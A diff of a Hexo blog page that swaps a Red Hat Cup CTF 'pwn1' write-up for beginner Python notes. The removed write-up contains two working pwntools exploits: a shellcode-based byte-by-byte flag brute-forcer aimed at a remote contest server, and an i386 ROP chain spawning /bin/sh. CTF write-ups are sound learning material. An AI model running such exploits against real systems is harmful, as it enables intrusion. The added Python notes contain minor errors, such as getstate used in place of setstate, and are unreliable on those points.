@@ -86,22 +86,22 @@
 
 
 
-<meta name="description" content="pwn1程序静态链接，真恶心，呕。 首先分析程序流 main   catflag   maby is good   give me   该程序，第一个模块的函数读取了flag，写入bss段。第二个模块的函数又将bss段里的flag写入了堆里，并且将v1里的数据写入bss进行覆盖。第三个模块通过index定位，读取堆里的flag（读取1个字节）放入v2，mmap分配了一个带有执行权限的内存空间，而且">
+<meta name="description" content="python的一些小点记录\在一行的末尾作为跨行字符串例如： 1print(&quot;a	\n  此时你想按回车进行下一行输入，就会发现    是的，不允许了。这时候就可以在\n后再加上\      但是呢，也可以利用另外一种写法—-长字符串(triple quoted) 1234print(&apos;&apos;&apos;aaaaaaaaaa&apos;&apos;&apos;)  这也是完全允许的！ random模块12x = random.getstat">
 <meta property="og:type" content="article">
-<meta property="og:title" content="红帽杯pwn wp">
-<meta property="og:url" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/index.html">
+<meta property="og:title" content="python的初学时光">
+<meta property="og:url" content="http://yoursite.com/2020/02/24/python的初学时光/index.html">
 <meta property="og:site_name" content="zhz&#39;blog">
-<meta property="og:description" content="pwn1程序静态链接，真恶心，呕。 首先分析程序流 main   catflag   maby is good   give me   该程序，第一个模块的函数读取了flag，写入bss段。第二个模块的函数又将bss段里的flag写入了堆里，并且将v1里的数据写入bss进行覆盖。第三个模块通过index定位，读取堆里的flag（读取1个字节）放入v2，mmap分配了一个带有执行权限的内存空间，而且">
+<meta property="og:description" content="python的一些小点记录\在一行的末尾作为跨行字符串例如： 1print(&quot;a	\n  此时你想按回车进行下一行输入，就会发现    是的，不允许了。这时候就可以在\n后再加上\      但是呢，也可以利用另外一种写法—-长字符串(triple quoted) 1234print(&apos;&apos;&apos;aaaaaaaaaa&apos;&apos;&apos;)  这也是完全允许的！ random模块12x = random.getstat">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/image-20191111222819651.png">
-<meta property="og:image" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/image-20191111222903850.png">
-<meta property="og:image" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/image-20191111222943178.png">
-<meta property="og:image" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/image-20191111223104658.png">
-<meta property="og:updated_time" content="2019-11-12T09:30:26.046Z">
+<meta property="og:image" content="http://yoursite.com/2020/02/24/python的初学时光/D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200224182743559.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/24/python的初学时光/image-20200224182743559.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/24/python的初学时光/D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200224183022740.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/24/python的初学时光/image-20200224183022740.png">
+<meta property="og:updated_time" content="2020-03-17T13:03:08.173Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="红帽杯pwn wp">
-<meta name="twitter:description" content="pwn1程序静态链接，真恶心，呕。 首先分析程序流 main   catflag   maby is good   give me   该程序，第一个模块的函数读取了flag，写入bss段。第二个模块的函数又将bss段里的flag写入了堆里，并且将v1里的数据写入bss进行覆盖。第三个模块通过index定位，读取堆里的flag（读取1个字节）放入v2，mmap分配了一个带有执行权限的内存空间，而且">
-<meta name="twitter:image" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/image-20191111222819651.png">
+<meta name="twitter:title" content="python的初学时光">
+<meta name="twitter:description" content="python的一些小点记录\在一行的末尾作为跨行字符串例如： 1print(&quot;a	\n  此时你想按回车进行下一行输入，就会发现    是的，不允许了。这时候就可以在\n后再加上\      但是呢，也可以利用另外一种写法—-长字符串(triple quoted) 1234print(&apos;&apos;&apos;aaaaaaaaaa&apos;&apos;&apos;)  这也是完全允许的！ random模块12x = random.getstat">
+<meta name="twitter:image" content="http://yoursite.com/2020/02/24/python的初学时光/D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200224182743559.png">
 
 
 
@@ -131,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/11/11/红帽杯pwn-wp/">
+  <link rel="canonical" href="http://yoursite.com/2020/02/24/python的初学时光/">
 
 
 
 
 
-  <title>红帽杯pwn wp | zhz'blog</title>
+  <title>python的初学时光 | zhz'blog</title>
   
 
 
@@ -298,7 +298,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/11/红帽杯pwn-wp/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/24/python的初学时光/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="zhz">
@@ -315,7 +315,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">红帽杯pwn wp</h1>
+          <h1 class="post-title" itemprop="name headline">python的初学时光</h1>
         
 
         <div class="post-meta">
@@ -327,8 +327,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-11T22:18:51+08:00">
-                2019-11-11
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-24T18:24:07+08:00">
+                2020-02-24
               </time>
             
 
@@ -401,31 +401,61 @@
       
 
       
-        <h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>程序静态链接，真恶心，呕。</p>
-<p>首先分析程序流</p>
-<p>main</p>
-<img src="/2019/11/11/红帽杯pwn-wp/image-20191111222819651.png">
+        <h4 id="python的一些小点记录"><a href="#python的一些小点记录" class="headerlink" title="python的一些小点记录"></a>python的一些小点记录</h4><h5 id="在一行的末尾作为跨行字符串"><a href="#在一行的末尾作为跨行字符串" class="headerlink" title="\在一行的末尾作为跨行字符串"></a>\在一行的末尾作为跨行字符串</h5><p>例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"a	\n</span></span><br></pre></td></tr></table></figure>
 
-<p>catflag</p>
-<img src="/2019/11/11/红帽杯pwn-wp/image-20191111222903850.png">
+<p>此时你想按回车进行下一行输入，就会发现</p>
+<p><img src="//yoursite.com/2020/02/24/python的初学时光/D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200224182743559.png" alt="image-20200224182743559"></p>
+<img src="/2020/02/24/python的初学时光/image-20200224182743559.png">
 
-<p>maby is good</p>
-<img src="/2019/11/11/红帽杯pwn-wp/image-20191111222943178.png">
+<p>是的，不允许了。这时候就可以在\n后再加上\</p>
+<p><img src="//yoursite.com/2020/02/24/python的初学时光/D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200224183022740.png" alt="image-20200224183022740"></p>
+<img src="/2020/02/24/python的初学时光/image-20200224183022740.png">
 
-<p>give me</p>
-<img src="/2019/11/11/红帽杯pwn-wp/image-20191111223104658.png">
 
-<p>该程序，第一个模块的函数读取了flag，写入bss段。第二个模块的函数又将bss段里的flag写入了堆里，并且将v1里的数据写入bss进行覆盖。第三个模块通过index定位，读取堆里的flag（读取1个字节）放入v2，mmap分配了一个带有执行权限的内存空间，而且可以往里面读3个字节，随后把这个mmap分配的内 存地址赋给一个函数指针，并且执行，在这里把它称为函数v3。</p>
-<p>红箭头指的就是关键地址，我们可以直接分析该模块的汇编。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [ebp+var_14]  //这里就是mov eax, v3</span><br><span class="line">call eax  //这就是关键点，执行v3</span><br></pre></td></tr></table></figure>
 
-<p>那么自然想到往里写入code，使得之后的赋值mov [ebp+var_10], eax （就是对v4赋值）中的eax可控。使得最后的比对可控，是我们控制的v4与flag中的数据进行比对，从而达到爆破的目的</p>
-<p>贴上exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#*!/usr/bin/python*</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#*-\*- coding:UTF-8 -**</span></span><br><span class="line"></span><br><span class="line">*<span class="keyword">from</span>* pwn *<span class="keyword">import</span>* *</span><br><span class="line"></span><br><span class="line">*<span class="keyword">import</span>* string</span><br><span class="line"></span><br><span class="line">*<span class="keyword">from</span>* time *<span class="keyword">import</span>* sleep</span><br><span class="line"></span><br><span class="line">\<span class="comment">#*context.log_level = 'debug'*</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> *<span class="title">Game</span>*<span class="params">(index,char)</span>:</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#  *cn = process('./pwn')*</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#  *gdb.attach(cn,'b \*0x08048C5B')*</span></span><br><span class="line"></span><br><span class="line">  cn = remote(<span class="string">'47.104.190.38'</span>,<span class="number">12001</span>)</span><br><span class="line"></span><br><span class="line">  shellcode = <span class="string">'RX\xc3'</span> //push edx ; pop eax ; ret</span><br><span class="line"></span><br><span class="line">  size = ord(char) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Give me a index:'</span>)</span><br><span class="line"></span><br><span class="line">  cn.sendline(str(index))</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Three is good number,I like it very much!'</span>)</span><br><span class="line"></span><br><span class="line">  cn.send(shellcode)</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Leave you name of size:'</span>)</span><br><span class="line"></span><br><span class="line">  cn.sendline(str(size))</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Tell me:\n'</span>)</span><br><span class="line"></span><br><span class="line">  cn.send((size<span class="number">-1</span>)*<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">  info = cn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">  *<span class="keyword">if</span>*(<span class="string">'2'</span> <span class="keyword">in</span> info):</span><br><span class="line"></span><br><span class="line">​    cn.close()</span><br><span class="line"></span><br><span class="line">​    *<span class="keyword">return</span>* <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">elif</span>*(<span class="string">'1'</span> <span class="keyword">in</span> info):</span><br><span class="line"></span><br><span class="line">​    print(char)</span><br><span class="line"></span><br><span class="line">​    cn.close()</span><br><span class="line"></span><br><span class="line">​    *<span class="keyword">return</span>* <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">else</span>*:</span><br><span class="line"></span><br><span class="line">​    cn.close()</span><br><span class="line"></span><br><span class="line">​    print(info)</span><br><span class="line"></span><br><span class="line">​    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">*<span class="keyword">if</span>* __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">  src = string.printable</span><br><span class="line"></span><br><span class="line">  flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">for</span>* i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line"></span><br><span class="line">​    *<span class="keyword">for</span>* j <span class="keyword">in</span> src:</span><br><span class="line"></span><br><span class="line">​      *<span class="keyword">if</span>* Game(i, j):</span><br><span class="line"></span><br><span class="line">​        flag += j</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">​        *<span class="keyword">if</span>* j == <span class="string">'&#125;'</span>:</span><br><span class="line"></span><br><span class="line">​          <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">​          exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">​        *<span class="keyword">break</span>*</span><br></pre></td></tr></table></figure>
+<p>但是呢，也可以利用另外一种写法—-长字符串(triple quoted)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'''a</span></span><br><span class="line"><span class="string">aaa</span></span><br><span class="line"><span class="string">aaa</span></span><br><span class="line"><span class="string">aaa'''</span>)</span><br></pre></td></tr></table></figure>
 
-<p>或者也可以利用最后的输入，提前写好code（xchg ecx, esp）进行rop</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span><span class="params">(signum=None, stack=None)</span>:</span></span><br><span class="line">    print(<span class="string">'Strip  all debugging information'</span>)</span><br><span class="line">    os.system(<span class="string">'rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script'</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sig <span class="keyword">in</span> [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: </span><br><span class="line">    signal.signal(sig, clear)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # Create a symbol file for GDB debugging</span></span><br><span class="line"><span class="comment"># try:</span></span><br><span class="line"><span class="comment">#     gdb_symbols = '''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     '''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     f = open('/tmp/gdb_symbols.c', 'w')</span></span><br><span class="line"><span class="comment">#     f.write(gdb_symbols)</span></span><br><span class="line"><span class="comment">#     f.close()</span></span><br><span class="line"><span class="comment">#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')</span></span><br><span class="line"><span class="comment">#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')</span></span><br><span class="line"><span class="comment"># except Exception as e:</span></span><br><span class="line"><span class="comment">#     pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">execve_file = <span class="string">'./pwn'</span></span><br><span class="line"><span class="comment"># sh = process(execve_file, env=&#123;'LD_PRELOAD': '/tmp/gdb_symbols.so'&#125;)</span></span><br><span class="line">sh = process(execve_file)</span><br><span class="line"><span class="comment"># sh = remote('47.104.190.38', 12001)</span></span><br><span class="line">elf = ELF(execve_file)</span><br><span class="line"><span class="comment"># libc = ELF('./libc-2.27.so')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create temporary files for GDB debugging</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    gdbscript = <span class="string">'''</span></span><br><span class="line"><span class="string">    b *0x8048c5b</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    f = open(<span class="string">'/tmp/gdb_pid'</span>, <span class="string">'w'</span>)</span><br><span class="line">    f.write(str(proc.pidof(sh)[<span class="number">0</span>]))</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    f = open(<span class="string">'/tmp/gdb_script'</span>, <span class="string">'w'</span>)</span><br><span class="line">    f.write(gdbscript)</span><br><span class="line">    f.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'index:\n'</span>, str(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">xchg ecx, esp</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">sh.sendafter(<span class="string">' much!\n'</span>, payload)</span><br><span class="line">sh.sendlineafter(<span class="string">'size:\n'</span>, str(<span class="number">0x1ff</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">layout = [</span><br><span class="line">    <span class="number">0x08072fb1</span>, <span class="comment">#: pop edx; pop ecx; pop ebx; ret; </span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x80f6d40</span>,</span><br><span class="line">    <span class="number">0x080c11e6</span>, <span class="comment">#: pop eax; ret; </span></span><br><span class="line">    <span class="number">11</span>,</span><br><span class="line">    <span class="number">0x080738c0</span>, <span class="comment">#: int 0x80; ret; </span></span><br><span class="line">]</span><br><span class="line">sh.sendafter(<span class="string">'me:\n'</span>, flat(layout).ljust(<span class="number">0x80</span>, <span class="string">'\0'</span>) + <span class="string">'/bin/sh\0'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">clear()</span><br></pre></td></tr></table></figure>
+<p>这也是完全允许的！</p>
+<h5 id="random模块"><a href="#random模块" class="headerlink" title="random模块"></a>random模块</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = random.getstate() //获取seed情况</span><br><span class="line">random.getstate(x) //这样就能将seed情况还原为以前记录的情况</span><br></pre></td></tr></table></figure>
+
+<h5 id="decimal模块（十进制数）"><a href="#decimal模块（十进制数）" class="headerlink" title="decimal模块（十进制数）"></a>decimal模块（十进制数）</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = decimal.Decimal(<span class="string">'0.1'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = decimal.Decimal(<span class="string">'0.2'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a+b)</span><br><span class="line"><span class="number">0.3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = decimal.Decimal(<span class="string">'0.3'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a + b == c</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="列表的插入"><a href="#列表的插入" class="headerlink" title="列表的插入"></a>列表的插入</h5><p>.append()</p>
+<p>允许往列表末尾插入一个元素</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number.append(<span class="string">'1'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>.extend()</p>
+<p>允许往列表末尾插入任意个元素</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number.extend([<span class="string">'竹林'</span>,<span class="string">'我去'</span>])</span><br></pre></td></tr></table></figure>
+
+<p>.insert()</p>
+<p>允许往列表任意位置插入一个元素</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number.insert(<span class="number">0</span>,<span class="string">'xx'</span>)</span><br></pre></td></tr></table></figure>
+
+<h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><p>filter(function or None, iterable)</p>
+<p>filter()会自动将为Flase的元素过滤，输出方法为True的元素</p>
+<p>第一个参数可以是一个函数也可以是一个None。</p>
+<p>当第一个参数是一个函数时，我们可以人为定义这个函数当作一个过滤规则，例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">odd</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x%<span class="number">2</span></span><br><span class="line"></span><br><span class="line">temp = range(<span class="number">10</span>)  //<span class="number">0</span><span class="number">-9</span></span><br><span class="line">show = filter(odd,temp)</span><br><span class="line">list(show)</span><br><span class="line">[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list(filter(<span class="keyword">lambda</span> x:x%<span class="number">2</span>,temp))</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure>
+
+<p>当然，还有一种类似的函数，map()。但是map不是过滤器，而且是遍历的，输出的是值。</p>
+<p>例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list(map(<span class="keyword">lambda</span> x:<span class="keyword">not</span>(x%<span class="number">3</span>),range(<span class="number">100</span>)))</span><br><span class="line">[<span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>]</span><br></pre></td></tr></table></figure>
+
+<p>注：map()后面是可以接受多个序列作为参数的</p>
+<p>将字符串转为二进制输出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">''</span>.join([bin(ord(c)).replace(<span class="string">'0b'</span>,<span class="string">''</span>)<span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br></pre></td></tr></table></figure>
+
+<p>在字符串中插入字符</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a =<span class="string">'asdefregtreytrh'</span></span><br><span class="line">lista = list(a)//因为python中str是不可变的变量，所以需要list辅助</span><br><span class="line">lista.insert(<span class="number">1</span>,<span class="string">','</span>)</span><br><span class="line">a = <span class="string">''</span>.join(lista)</span><br></pre></td></tr></table></figure>
+
+<p>在字符串中删去你不要的字符</p>
